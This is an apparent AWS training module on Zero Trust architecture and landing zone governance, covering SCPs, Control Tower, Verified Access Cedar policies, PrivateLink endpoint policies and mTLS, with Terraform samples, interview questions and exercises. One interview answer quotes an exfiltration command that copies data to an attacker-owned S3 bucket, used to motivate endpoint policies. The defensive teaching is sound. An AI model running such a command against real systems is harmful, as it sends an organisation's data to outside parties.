---
topic: "Zero Trust Architecture and Landing Zone Governance"
module: "07-architecture-patterns"
track: "aws"
last-tested: "2026-11"
prerequisites:
  - "01-foundations/03-iam.md"
  - "04-networking/04-vpc-peering-transit-gateway-and-privatelink.md"
  - "06-operations/11-multi-account-strategy.md"
complexity: "advanced"
tags:
  - "zero-trust"
  - "landing-zone"
  - "control-tower"
  - "organizations"
  - "privatelink"
  - "verified-access"
  - "security"
---

# Zero Trust Architecture and Landing Zone Governance

## Table of Contents
- [1. What & Why](#1-what--why)
- [2. Core Concepts](#2-core-concepts)
- [3. How It Works Internally](#3-how-it-works-internally)
- [4. Syntax & Usage](#4-syntax--usage)
- [5. Practical Examples](#5-practical-examples)
- [6. Best Practices](#6-best-practices)
- [7. Common Mistakes](#7-common-mistakes)
- [8. Performance, Security & Cost Notes](#8-performance-security--cost-notes)
- [9. Comparison Table](#9-comparison-table)
- [10. Interview Questions](#10-interview-questions)
- [11. Practice Exercises](#11-practice-exercises)
- [12. Summary / Cheat Sheet](#12-summary--cheat-sheet)
- [13. Further Reading](#13-further-reading)

---

## 1. What & Why

Traditional enterprise security relied on a "castle-and-moat" perimeter model: once a user or machine crossed the corporate VPN or network boundary into the internal VPC, it was granted broad implicit trust. In modern cloud and distributed workforce environments, this model fails. An attacker compromising a single internal endpoint or VPN credential can move laterally across internal subnets.

**Zero Trust Architecture (ZTA)** shifts security from network locality to **continuous, context-aware identity and device verification**. Guided by the NIST SP 800-207 standard, Zero Trust operates on the fundamental principle: **"Never Trust, Always Verify."** On AWS, Zero Trust is coupled with an enterprise **Multi-Account Landing Zone**—orchestrated via **AWS Organizations** and **AWS Control Tower**—to enforce strict guardrails, isolate blast radiuses, and eliminate static trust relationships across enterprise systems.

### Why Zero Trust & Landing Zones on AWS?
- **Eliminate Implicit Network Trust**: Being on an internal subnet or VPN grants zero access by default. Every API call and TCP stream must authenticate with signed IAM SigV4 or mTLS tokens.
- **Micro-Segmentation & Private Connectivity**: Use **AWS PrivateLink** and VPC Endpoints to connect services privately without exposing public IPs or permitting arbitrary lateral VPC routing.
- **Blast Radius Containment**: Autonomous AWS accounts (e.g., separate accounts for Production, Staging, Security, and Log Archive) prevent a breach in a dev environment from compromising production databases.
- **Centralized Compliance (SCPs & Guardrails)**: Service Control Policies (SCPs) enforce immutable boundaries (preventing disabling CloudTrail, blocking unapproved AWS regions, and preventing public S3 buckets) regardless of local admin privileges.

---

## 2. Core Concepts

### Zero Trust Pillars on AWS
1. **Strong Identity as the Primary Perimeter**:
   - **AWS IAM Identity Center (SSO)**: Centralized workforce access federated via Okta, Azure AD, or Google Workspace using SAML 2.0 / SCIM.
   - **Mutual TLS (mTLS)**: Enforce bidirectional cryptographic certificate validation between microservices via Application Load Balancers or AWS App Mesh/VPC Lattice.
2. **Device and Context-Aware Access**:
   - **AWS Verified Access**: Secure access to corporate web applications without a VPN. Evaluates user identity and real-time device posture (CrowdStrike, Jamf) before granting application access.
3. **Private Network Boundaries**:
   - **AWS PrivateLink**: Securely exposes services across VPCs and accounts via private IP interfaces, preventing broad IP routing and lateral movement.
4. **Landing Zone Multi-Account Hierarchy**:
   - **AWS Organizations**: Hierarchical Organization Units (OUs) grouping accounts (Core, Security, Workloads, Sandbox).
   - **AWS Control Tower**: Automates account factory provisioning, baseline guardrails (detective and preventative), and compliance reporting.
   - **Service Control Policies (SCPs)**: Guardrail policies applied to OUs that set maximum allowable permissions across member accounts.

---

## 3. How It Works Internally

```
+----------------------------------------------------------------------------------------------------+
|                         ENTERPRISE ZERO TRUST & LANDING ZONE TOPOLOGY                              |
+----------------------------------------------------------------------------------------------------+

  [ Remote Workforce / Managed Devices ]
            |
            | 1. HTTPS / TLS 1.3
            v
  +--------------------------------------------------------------------------------------------------+
  | AWS Verified Access (VPN-less Application Ingress)                                               |
  |  - Validates Identity: OIDC / IAM Identity Center                                                |
  |  - Validates Device Posture: Jamf / CrowdStrike / Microsoft Intune                               |
  |  - Evaluates Cedar Policy: Permit ONLY if device is managed & encryption enabled                 |
  +--------------------------------------------------------------------------------------------------+
            |
            | 2. Verified Context Route
            v
  +--------------------------------------------------------------------------------------------------+
  | CENTRAL NETWORK HUB ACCOUNT (Inspection VPC / Transit Gateway)                                   |
  |  - Ingress/Egress AWS Network Firewall (Deep Packet Inspection)                                  |
  +--------------------------------------------------------------------------------------------------+
            |
            | AWS PrivateLink (No VPC Peering / No Lateral Route Table Leaks)
            v
  +--------------------------------------------------------------------------------------------------+
  | PRODUCTION WORKLOAD ACCOUNT (Encapsulated Blast Radius)                                          |
  |                                                                                                  |
  |  [ Private Subnet: ECS / EKS Fleet ]                                                             |
  |     - mTLS Service-to-Service Communication (AWS Certificate Manager Private CA)                 |
  |     - VPC Interface Endpoints for S3, DynamoDB, Secrets Manager (SigV4 Signed)                  |
  |     - Strict Micro-Segmented Security Groups (Least Privilege Port/CIDR)                         |
  +--------------------------------------------------------------------------------------------------+
            ^
            | SCPs Enforced by Management Root
  +--------------------------------------------------------------------------------------------------+
  | AWS ORGANIZATIONS SERVICE CONTROL POLICIES (SCPs)                                                |
  |  - Deny Leaving Organization                                                                     |
  |  - Deny Disabling CloudTrail / GuardDuty / Config                                                |
  |  - Deny Deploying Outside Approved Regions (us-east-1, us-west-2)                                |
  +--------------------------------------------------------------------------------------------------+
```

### Cedar Policy Evaluation in AWS Verified Access
When a user attempts to access an internal administration dashboard:
1. The user connects to the AWS Verified Access endpoint.
2. Verified Access queries the Identity Provider (e.g., Okta via OIDC) for user group claims and queries the Device Management tool (e.g., CrowdStrike Falcon) for device risk scores.
3. The built-in **Cedar policy engine** evaluates rules:
   ```cedar
   permit(principal, action, resource)
   when {
       context.identity.groups.contains("DevOpsEngineers") &&
       context.device.is_managed == true &&
       context.device.risk_score <= 20
   };
   ```
4. If the device is unmanaged or the risk score exceeds 20, access is rejected at the AWS edge before packets reach the target VPC.

---

## 4. Syntax & Usage

### 4.1 Terraform: Enterprise Service Control Policy (SCP) Restricting Regions

```hcl
terraform {
  required_version = ">= 1.5.0"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.40"
    }
  }
}

provider "aws" {
  region = "us-east-1"
}

# Service Control Policy: Region Restriction Guardrail
resource "aws_organizations_policy" "region_restriction_scp" {
  name        = "EnforceApprovedRegionsOnly"
  description = "Denies all actions outside approved production regions (us-east-1 and us-west-2)"
  type        = "SERVICE_CONTROL_POLICY"

  content = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid       = "DenyAllOutsideApprovedRegions"
        Effect    = "Deny"
        NotAction = [
          "iam:*",
          "organizations:*",
          "route53:*",
          "route53domains:*",
          "cloudfront:*",
          "wafv2:*",
          "sts:*",
          "support:*",
          "shield:*"
        ]
        Resource = "*"
        Condition = {
          StringNotEquals = {
            "aws:RequestedRegion" = [
              "us-east-1",
              "us-west-2"
            ]
          }
        }
      }
    ]
  })
}

# Attach SCP to Workloads Organizational Unit (OU)
resource "aws_organizations_policy_attachment" "workloads_attach" {
  policy_id = aws_organizations_policy.region_restriction_scp.id
  target_id = "ou-prod-12345678"
}
```

---

## 5. Practical Examples

### Example 1: SCP Blocking Disabling of CloudTrail and GuardDuty

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PreventTamperingWithSecurityServices",
      "Effect": "Deny",
      "Action": [
        "cloudtrail:DeleteTrail",
        "cloudtrail:StopLogging",
        "cloudtrail:UpdateTrail",
        "guardduty:DeleteDetector",
        "guardduty:DisassociateFromMasterAccount",
        "guardduty:StopMonitoringMembers",
        "guardduty:UpdateDetector",
        "config:DeleteConfigRule",
        "config:DeleteConfigurationRecorder",
        "config:StopConfigurationRecorder"
      ],
      "Resource": "*",
      "Condition": {
        "ArnNotLike": {
          "aws:PrincipalARN": [
            "arn:aws:iam::*:role/aws-service-role/*",
            "arn:aws:iam::123456789012:role/OrganizationAdminRole"
          ]
        }
      }
    }
  ]
}
```

### Example 2: AWS Verified Access Policy Using Cedar Syntax

```cedar
// Allow access to Internal Production Grafana Dashboard
// Requires user to be in the "MonitoringAdmins" group and device to be clean
permit(
    principal,
    action in [Action::"HTTP_GET", Action::"HTTP_POST"],
    resource in [Resource::"Endpoint:va-endpoint-0123456789abcdef"]
)
when {
    // 1. Identity Verification
    context.identity.groups.contains("MonitoringAdmins") &&
    context.identity.email.endsWith("@enterprise.com") &&

    // 2. Device Posture Context Verification
    context.device.is_managed == true &&
    context.device.os_version >= "14.2" &&
    context.device.compromised == false
};
```

### Example 3: Terraform AWS PrivateLink VPC Endpoint with Endpoint Policy

```hcl
# VPC Interface Endpoint for Secrets Manager
resource "aws_vpc_endpoint" "secretsmanager" {
  vpc_id              = "vpc-0123456789abcdef0"
  service_name        = "com.amazonaws.us-east-1.secretsmanager"
  vpc_endpoint_type   = "Interface"
  subnet_ids          = ["subnet-0123456789abcdef1", "subnet-0123456789abcdef2"]
  security_group_ids  = [aws_security_group.vpce_sg.id]
  private_dns_enabled = true

  # Restrict endpoint: Allow reading ONLY production database credentials
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid       = "AllowReadSpecificSecretOnly"
        Effect    = "Allow"
        Principal = "*"
        Action    = [
          "secretsmanager:GetSecretValue",
          "secretsmanager:DescribeSecret"
        ]
        Resource = "arn:aws:secretsmanager:us-east-1:123456789012:secret:production/database/*"
      }
    ]
  })
}

# Security Group controlling traffic to the VPC Endpoint
resource "aws_security_group" "vpce_sg" {
  name        = "secretsmanager-vpce-sg"
  description = "Allows TLS inbound only from application microservice security group"
  vpc_id      = "vpc-0123456789abcdef0"

  ingress {
    from_port       = 443
    to_port         = 443
    protocol        = "tcp"
    security_groups = [aws_security_group.app_workload_sg.id]
  }
}
```

### Example 4: Enforcing mTLS on an Application Load Balancer

```hcl
resource "aws_lb" "mtls_alb" {
  name               = "internal-zero-trust-alb"
  internal           = true
  load_balancer_type = "application"
  subnets            = ["subnet-0123456789abcdef1", "subnet-0123456789abcdef2"]
  security_groups    = [aws_security_group.alb_sg.id]
}

# Trust Store containing root and intermediate CAs
resource "aws_lb_trust_store" "pki_trust_store" {
  name                              = "corporate-internal-ca-store"
  ca_certificates_bundle_s3_bucket = "enterprise-pki-trust-store"
  ca_certificates_bundle_s3_key    = "truststores/corporate_ca_bundle.pem"
}

# Listener with Mutual TLS Verification Enabled
resource "aws_lb_listener" "mtls_listener" {
  load_balancer_arn = aws_lb.mtls_alb.arn
  port              = 443
  protocol          = "HTTPS"
  ssl_policy        = "ELBSecurityPolicy-TLS13-1-2-2021-06"
  certificate_arn   = "arn:aws:acm:us-east-1:123456789012:certificate/abc-123"

  mutual_authentication {
    mode            = "verify" # Rejects requests without valid client certificate
    trust_store_arn = aws_lb_trust_store.pki_trust_store.arn
  }

  default_action {
    type             = "forward"
    target_group_arn = aws_lb_target_group.app_targets.arn
  }
}
```

### Example 5: Auditing Landing Zone Account Drift via AWS CLI

```bash
# Check compliance status of AWS Control Tower guardrails across all accounts
aws controltower list-enabled-controls \
    --target-identifier "arn:aws:organizations::123456789012:ou/o-root/ou-prod-12345678"

# Check AWS Security Hub standards across multi-account organization
aws securityhub get-enabled-standards

# Scan for unauthorized public S3 buckets in all accounts using S3 Access Analyzer
aws accessanalyzer list-analyzers \
    --type ORGANIZATION
```

---

## 6. Best Practices

1. **Adopt a Multi-Account Architecture Early**: Isolate environments (Dev, Test, Prod) and foundational functions (Log Archive, Security Tooling, Network Hub) into separate AWS accounts to enforce physical blast radius isolation.
2. **Never Use Root Account Credentials for Day-to-Day Operations**: Lock root credentials behind hardware MFA keys (FIDO2) and delegate administrative functions via IAM Identity Center.
3. **Use Preventative SCPs as Inviolable Guardrails**: Prevent account administrators from modifying core logging (CloudTrail), disabling GuardDuty, or creating public S3 buckets.
4. **Deploy AWS PrivateLink Instead of Full VPC Peering**: When two microservices need to exchange data, expose an interface VPC endpoint rather than establishing bidirectional CIDR routing that allows broad lateral movement.
5. **Implement Continuous Device Posture Verification**: Use AWS Verified Access to enforce that only company-managed, encrypted, malware-free endpoints can communicate with internal business tools.
6. **Enforce IMDSv2 Account-Wide**: Require Instance Metadata Service Version 2 (`HttpTokens=required`) on all EC2 instances to mitigate SSRF credential theft vulnerabilities.

---

## 7. Common Mistakes

| Mistake | Why It Hurts | Correct Approach |
|:---|:---|:---|
| **Relying solely on perimeter VPNs** | Attackers gaining valid VPN credentials can probe and attack all internal network IP addresses laterally. | Implement Zero Trust via AWS Verified Access and micro-segmentation. |
| **Applying permissive `Allow *` SCPs to root** | Rogue or compromised administrator credentials in a child account can delete security trails, spin up expensive crypto miners, or dump data. | Apply strict restrictive SCPs denying unauthorized regions and actions across child accounts. |
| **Using wide-open VPC Peering meshes** | Every subnet in VPC A can route to every subnet in VPC B, creating a massive blast radius if one workload is breached. | Use AWS PrivateLink or AWS VPC Lattice for granular service-level connectivity. |
| **Storing static AWS Access Keys on workstations** | Long-lived credentials are easily leaked, hardcoded, or committed to GitHub repositories. | Enforce short-lived temporary credentials via **AWS IAM Identity Center** and AWS CLI `aws sso login`. |
| **Omitting Endpoint Policies on VPC Endpoints** | A compromised container in your VPC can use your VPC endpoint to upload stolen data to an external, attacker-owned S3 bucket. | Attach strict VPC Endpoint Policies restricting actions to your organization's bucket ARNs only. |
| **Single shared production AWS account** | A failure, noisy neighbor, quota exhaustion, or compromise in one system impacts all enterprise workloads. | Segregate workloads across distinct AWS accounts managed by Control Tower. |

---

## 8. Performance, Security & Cost Notes

### Performance
- **PrivateLink Latency Overhead**: Adds sub-millisecond latency (< 1ms) while avoiding public internet routing and NAT gateway traversing.
- **ALB mTLS Handshake Overhead**: Minimal impact on modern hardware; use TLS session tickets and persistent HTTP keep-alive connections to amortize handshake costs.

### Security Compliance
- **NIST SP 800-207**: Fully aligns with Zero Trust architecture requirements across identity, workload, network, and data pillars.
- **FedRAMP & SOC 2**: Multi-account isolation and centralized log archives are primary compliance requirements for high-assurance audits.

### Cost Breakdown
- **AWS Organizations & SCPs**: Free service.
- **AWS Control Tower**: Free service (underlying resources: AWS Config rules, CloudTrail, S3 buckets are billed standard rates).
- **AWS PrivateLink**: \$0.01/hour per VPC endpoint per AZ + \$0.01 per GB processed.
- **AWS Verified Access**: \$0.20 per application per hour + \$0.02 per GB processed.

---

## 9. Comparison Table

| Dimension | Traditional Perimeter Model | Zero Trust + Landing Zone Model |
|:---|:---|:---|
| **Primary Boundary** | Network CIDR / Subnet / VPN | Strong Identity (IAM / OIDC / mTLS) + Device Posture |
| **Internal Trust** | Implicit trust inside internal VPC | Zero implicit trust; all transactions verified and signed |
| **Lateral Movement Risk** | High (Flat network routing between servers) | Extremely Low (Micro-segmented PrivateLink / VPC Lattice) |
| **Account Boundary** | Single or few large multi-tenant accounts | Segregated multi-account hierarchy via Control Tower |
| **Access Control** | Static IP Security Groups and Bastions | Dynamic Cedar policies, Device Posture, IAM Identity Center |
| **Blast Radius** | Entire VPC / Entire Account | Scoped to individual service or single-purpose account |

---

## 10. Interview Questions

<details>
<summary><strong>1. What is the fundamental difference between an IAM Policy and a Service Control Policy (SCP)?</strong></summary>

- **IAM Policy**: Attached to IAM users, groups, or roles inside an individual AWS account. It **grants** specific permissions (identity-based) or defines who can access a resource (resource-based).
- **Service Control Policy (SCP)**: Attached to AWS Organizations roots, OUs, or accounts. It **never grants** permissions; instead, it acts as a **guardrail filter** that defines the maximum allowable permissions across member accounts. Even an account root user or an IAM admin with `AdministratorAccess` (`*:*`) cannot perform an action denied by an applicable SCP.
</details>

<details>
<summary><strong>2. How does AWS Verified Access enable zero trust access without requiring a traditional client VPN?</strong></summary>

AWS Verified Access acts as a secure reverse-proxy at the edge of your AWS environment:
1. When a remote employee requests an internal web tool (e.g., Jira or an internal admin panel), Verified Access intercepts the connection before traffic enters the VPC.
2. It authenticates the user via OIDC / IAM Identity Center and evaluates their real-time device health posture (via integrations with CrowdStrike, Jamf, Microsoft Intune).
3. It evaluates declarative **Cedar policies** (e.g., verifying user department, requiring OS encryption, ensuring risk score is zero).
4. If authorized, it proxies traffic to the internal Application Load Balancer via private VPC ENIs. This eliminates exposing open VPN concentrators to the internet and prevents lateral network movement.
</details>

<details>
<summary><strong>3. How can an attacker exfiltrate data through a standard S3 VPC Endpoint, and how do VPC Endpoint Policies prevent this?</strong></summary>

When an S3 Gateway Endpoint is added to a VPC route table, any process in the VPC can communicate with S3 over the private AWS backbone. An attacker who compromises an EC2 instance can execute `aws s3 cp sensitive_data.zip s3://attacker-owned-bucket/`. The request succeeds because S3 endpoints allow access to all S3 buckets by default. To prevent this, attach a **VPC Endpoint Policy** that denies access to all buckets not owned by your AWS Organization:
```json
"Condition": {
  "StringEquals": { "aws:PrincipalOrgID": "o-12345678" }
}
```
</details>

<details>
<summary><strong>4. Describe the standard recommended Multi-Account structure established by AWS Control Tower.</strong></summary>

A well-architected landing zone organizes accounts into distinct Organizational Units (OUs):
1. **Management Account**: Houses AWS Organizations, billing, and Control Tower administration. No workloads run here.
2. **Security OU**:
   - **Log Archive Account**: Central immutable repository for CloudTrail, VPC Flow Logs, and Config logs.
   - **Security Tooling Account**: Central administrator for GuardDuty, Security Hub, AWS Config, and IAM Access Analyzer.
3. **Core / Infrastructure OU**: Contains Shared Services and Network Hub accounts (Transit Gateways, Direct Connect, Inspection VPCs).
4. **Workloads OU**: Segregated into `Dev`, `Stage`, and `Prod` child accounts per business domain to isolate blast radiuses.
5. **Sandbox OU**: Isolated accounts with strict spending caps for developer experimentation.
</details>

<details>
<summary><strong>5. What is Mutual TLS (mTLS) and how is it implemented between microservices in AWS?</strong></summary>

In standard TLS, only the server proves its identity to the client via an SSL certificate. In **Mutual TLS (mTLS)**, both the client and server exchange and cryptographically verify each other's certificates during the TLS handshake, guaranteeing bidirectional identity verification and encryption. On AWS, mTLS is implemented using:
- **Application Load Balancers (ALB)** with Mutual Authentication enabled, verifying client certificates against an S3 CA Trust Store.
- **AWS Private Certificate Authority (Private CA)** to issue and rotate internal service certificates automatically.
- **AWS VPC Lattice** or **App Mesh** sidecars enforcing mTLS encryption and SigV4 authorization across services.
</details>

<details>
<summary><strong>6. Why is IAM Identity Center (AWS SSO) preferred over individual IAM users in child accounts?</strong></summary>

Individual IAM users lead to credential sprawl, static long-lived access keys, and complex offboarding processes across dozens of AWS accounts. **IAM Identity Center**:
1. Federates authentication with corporate Identity Providers (Okta, Azure AD) using SAML 2.0 and automated user sync via SCIM.
2. Provides a single sign-on portal where engineers assume short-lived, role-based STS credentials.
3. Automatically revokes access to all AWS accounts the moment an employee is disabled in the corporate identity provider.
</details>

<details>
<summary><strong>7. How does AWS PrivateLink uphold the Zero Trust principle of micro-segmentation?</strong></summary>

Traditional VPC Peering connects entire IP CIDR blocks, meaning every host in VPC A can potentially probe every host in VPC B unless complex, error-prone Security Groups and NACLs are maintained. **AWS PrivateLink** connects specific services via unidirectional TCP endpoints:
- The consumer VPC receives only a dedicated Elastic Network Interface (ENI) exposing a single TCP port (e.g., 443).
- No routing tables are shared, no IP CIDR overlap issues exist, and the consumer cannot initiate arbitrary lateral network scans against other machines in the producer VPC.
</details>

<details>
<summary><strong>8. What is the difference between detective and preventative guardrails in AWS Control Tower?</strong></summary>

- **Preventative Guardrails**: Implemented as **Service Control Policies (SCPs)**. They actively block unauthorized API calls from executing. (e.g., An API call attempting to create a public S3 bucket is rejected immediately with HTTP 403 Access Denied).
- **Detective Guardrails**: Implemented using **AWS Config Rules** and **AWS CloudTrail**. They allow the API call to execute, but continuously monitor resource state. If a resource violates compliance (e.g., an unencrypted EBS volume is launched), AWS Config flags the resource as non-compliant and triggers automated EventBridge remediation workflows.
</details>

---

## 11. Practice Exercises

<details>
<summary><strong>Challenge 1: Author and Attach an SCP Restricting AWS Regions</strong></summary>

**Goal**: Write an SCP denying all actions outside `us-east-1` and `us-west-2` (excluding global services like IAM and Route 53) and attach it to a test OU.
**Verification**: Attempt to launch an EC2 instance in `eu-west-1` using the AWS CLI and verify that the request is rejected with `Explicit Deny by Service Control Policy`.
</details>

<details>
<summary><strong>Challenge 2: Deploy an S3 Interface VPC Endpoint with an Access Policy</strong></summary>

**Goal**: Provision an S3 Interface VPC Endpoint in a private VPC and attach a policy permitting `s3:GetObject` only to your specific company bucket.
**Verification**: From an EC2 instance in the private subnet, verify that downloading from the allowed bucket succeeds, while attempting to download from an external public bucket fails.
</details>

<details>
<summary><strong>Challenge 3: Configure AWS IAM Identity Center Permission Sets</strong></summary>

**Goal**: Create an IAM Identity Center Permission Set with `ViewOnlyAccess` and assign it to a test group targeting a child workload account.
**Verification**: Log in via `aws sso login` and verify that the session can view CloudWatch logs but cannot terminate EC2 instances or alter IAM roles.
</details>

<details>
<summary><strong>Challenge 4: Deploy an ALB with Mutual TLS (mTLS)</strong></summary>

**Goal**: Provision an internal Application Load Balancer with an S3 trust store containing a custom Root CA certificate. Configure the listener with `mode = "verify"`.
**Verification**: Send an HTTPS request using `curl` with client certificate and key (`curl --cert client.crt --key client.key https://...`); confirm connection succeeds with client cert and is rejected without it.
</details>

<details>
<summary><strong>Challenge 5: Define an AWS Verified Access Cedar Policy</strong></summary>

**Goal**: Write a Cedar policy in AWS Verified Access requiring that user email ends with `@example.com` and device posture has `jamf.managed == true`.
**Verification**: Submit mock OIDC claims and verify that requests missing either condition are denied at the edge.
</details>

<details>
<summary><strong>Challenge 6: Audit Multi-Account Security Hub Findings via AWS CLI</strong></summary>

**Goal**: Enable Security Hub delegated administration and run an organization-wide compliance query.
**Verification**: Run `aws securityhub get-findings` filtering for `RecordState = ACTIVE` and `SeverityLabel = CRITICAL` across all member accounts.
</details>

---

## 12. Summary / Cheat Sheet

```
+----------------------------------------------------------------------------------------------------+
|                         ZERO TRUST & LANDING ZONE ARCHITECTURE CHEAT SHEET                         |
+----------------------------------------------------------------------------------------------------+
| Layer              | AWS Technology               | Zero Trust Implementation                      |
+--------------------+------------------------------+------------------------------------------------+
| Organization Roots | AWS Organizations & SCPs     | Inviolable baseline guardrails; regional limits|
| Multi-Account      | AWS Control Tower            | Physical blast radius isolation per workload   |
| Workforce Identity | IAM Identity Center (SSO)    | Short-lived STS roles, SCIM sync, MFA enforced |
| Edge Ingress       | AWS Verified Access          | VPN-less access based on identity & device risk|
| Private Transit    | AWS PrivateLink / Lattice    | Service micro-segmentation without flat routing|
| Service Encryption | Application Load Balancer    | mTLS bidirectional authentication via ACM      |
| Endpoint Security  | IMDSv2 Required              | Prevents SSRF credential theft vulnerabilities |
+----------------------------------------------------------------------------------------------------+
```

---

## 13. Further Reading

- [AWS Zero Trust Architecture Guiding Principles](https://aws.amazon.com/security/zero-trust/)
- [NIST Special Publication 800-207: Zero Trust Architecture](https://csrc.nist.gov/publications/detail/sp/800-207/final)
- [AWS Control Tower User Guide](https://docs.aws.amazon.com/controltower/latest/userguide/what-is-control-tower.html)
- [AWS Verified Access Developer Guide](https://docs.aws.amazon.com/verified-access/latest/ug/what-is-verified-access.html)
- [Cedar Policy Language Reference](https://www.cedarpolicy.com/)
